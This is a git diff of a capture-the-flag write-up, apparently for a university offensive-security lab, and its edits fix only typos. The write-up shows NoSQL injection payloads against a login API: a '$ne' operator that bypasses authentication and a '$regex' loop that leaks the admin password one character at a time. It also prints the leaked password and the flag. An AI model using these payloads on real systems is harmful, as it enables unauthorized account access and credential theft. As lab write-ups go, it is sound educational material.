@@ -55,13 +55,13 @@ http://offsec-chalbroker.osiris.cyber.nyu.edu:10001
 ```
 ![img.png](NuclearCodeBreak-In.png)
 
-This one looked pretty straight forward. First I had to determine if "admin" was the target username after creating a dummy profile for "nam10102":
+This one looked pretty straight forward. First, I had to determine if "admin" was the target username after creating a dummy profile for "nam10102":
 
 ```python
 Sending request to http://offsec-chalbroker.osiris.cyber.nyu.edu:10001/api/login with data: {'username': 'admin', 'password': {'$ne': 'nam10102'}}
 {'message': 'Login successful'}
 ```
-Once I was usre "admin" was the target username, I proceeded to leak the password for "admin" using the same looping function (with minor modifications).
+Once I was sure "admin" was the target username, I proceeded to leak the password for "admin" using the same looping function (with minor modifications).
 
 ```python
 data = {"username": {"$ne": ""}, "password": {"$regex": f"^{leaked_password}{re.escape(char)}"}}
@@ -69,7 +69,7 @@ data = {"username": {"$ne": ""}, "password": {"$regex": f"^{leaked_password}{re.
 Leaked password so far: ###AdminSe@#OdkopSKDacurePass123!
 No more characters to leak.
 ```
-Then I logged in the the "admin" and leaked password and the description displayed the code:
+Then I logged in the the "admin" and leaked password, and the description displayed the code:
 ![img.png](nuclear_code.png)
 ```python
 Description: flag{y0u_h4v3_n0w_4cc3ss_t0_nucl34r_w34p0n_0000000000000000}
